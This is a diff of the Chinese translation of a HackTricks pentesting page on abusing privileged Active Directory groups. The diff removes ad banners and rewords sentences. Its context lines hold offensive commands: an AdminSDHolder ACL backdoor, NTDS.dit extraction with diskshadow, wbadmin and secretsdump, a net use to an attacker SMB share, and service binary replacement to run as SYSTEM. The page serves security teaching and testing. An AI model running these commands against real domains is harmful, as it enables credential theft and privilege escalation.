@@ -2,13 +2,6 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-使用 [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) 轻松构建和 **自动化工作流程**，由世界上 **最先进** 的社区工具提供支持。\
-立即获取访问权限：
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
-
 ## 具有管理权限的知名组
 
 - **Administrators**
@@ -17,9 +10,9 @@
 
 ## 账户操作员
 
-该组有权创建不是域管理员的账户和组。此外，它还允许本地登录到域控制器 (DC)。
+该组有权创建不是域管理员的账户和组。此外，它还允许在域控制器（DC）上进行本地登录。
 
-要识别该组的成员，执行以下命令：
+要识别该组的成员，可以执行以下命令：
 ```powershell
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
@@ -37,19 +30,19 @@ Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
 ```
-一个脚本可用于加快恢复过程：[Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)。
+可以使用脚本来加快恢复过程：[Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)。
 
 有关更多详细信息，请访问 [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)。
 
 ## AD 回收站
 
-加入此组允许读取已删除的 Active Directory 对象，这可能会揭示敏感信息：
+加入此组可以读取已删除的 Active Directory 对象，这可能会揭示敏感信息：
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
 ### 域控制器访问
 
-对 DC 上文件的访问受到限制，除非用户是 `Server Operators` 组的一部分，这会改变访问级别。
+除非用户是 `Server Operators` 组的一部分，否则对 DC 上文件的访问是受限的，这会改变访问级别。
 
 ### 权限提升
 
@@ -61,7 +54,7 @@ C:\> .\PsService.exe security AppReadiness
 
 ## 备份操作员
 
-加入 `Backup Operators` 组可访问 `DC01` 文件系统，因为拥有 `SeBackup` 和 `SeRestore` 权限。这些权限使得即使没有明确的权限，也能进行文件夹遍历、列出和复制文件的操作，使用 `FILE_FLAG_BACKUP_SEMANTICS` 标志。此过程需要使用特定的脚本。
+加入 `Backup Operators` 组可访问 `DC01` 文件系统，因为拥有 `SeBackup` 和 `SeRestore` 权限。这些权限使得文件夹遍历、列出和复制文件的能力成为可能，即使没有明确的权限，使用 `FILE_FLAG_BACKUP_SEMANTICS` 标志。此过程需要使用特定的脚本。
 
 要列出组成员，请执行：
 ```powershell
@@ -92,7 +85,7 @@ Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Over
 
 #### 使用 diskshadow.exe
 
-1. 创建 `C` 盘的影子副本：
+1. 创建 `C` 盘的影像副本：
 ```cmd
 diskshadow.exe
 set verbose on
@@ -124,7 +117,7 @@ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
 #### 使用 wbadmin.exe
 
-1. 在攻击者机器上设置 SMB 服务器的 NTFS 文件系统，并在目标机器上缓存 SMB 凭据。
+1. 在攻击者机器上设置 NTFS 文件系统以用于 SMB 服务器，并在目标机器上缓存 SMB 凭据。
 2. 使用 `wbadmin.exe` 进行系统备份和 `NTDS.dit` 提取：
 ```cmd
 net use X: \\<AttackIP>\sharename /user:smbuser password
@@ -200,7 +193,7 @@ Hyper-V 管理员对 Hyper-V 拥有完全访问权限，这可以被利用来控
 
 ### 利用示例
 
-Hyper-V 管理员可以利用 Firefox 的 Mozilla Maintenance Service 以 SYSTEM 身份执行命令。这涉及创建一个指向受保护的 SYSTEM 文件的硬链接，并用恶意可执行文件替换它：
+Hyper-V 管理员可以利用 Firefox 的 Mozilla Maintenance Service 以 SYSTEM 身份执行命令。这涉及到创建一个指向受保护的 SYSTEM 文件的硬链接，并用恶意可执行文件替换它：
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
@@ -222,7 +215,7 @@ sc.exe start MozillaMaintenance
 ```powershell
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
-有关 **`SeLoadDriverPrivilege`** 的更详细利用技术，应咨询特定的安全资源。
+有关 **`SeLoadDriverPrivilege`** 的更详细利用技术，应该查阅特定的安全资源。
 
 #### 远程桌面用户
 
@@ -265,11 +258,5 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 - [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
 - [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
 
-<figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-使用 [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) 轻松构建和 **自动化工作流程**，由世界上 **最先进** 的社区工具提供支持。\
-立即获取访问权限：
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 {{#include ../../banners/hacktricks-training.md}}
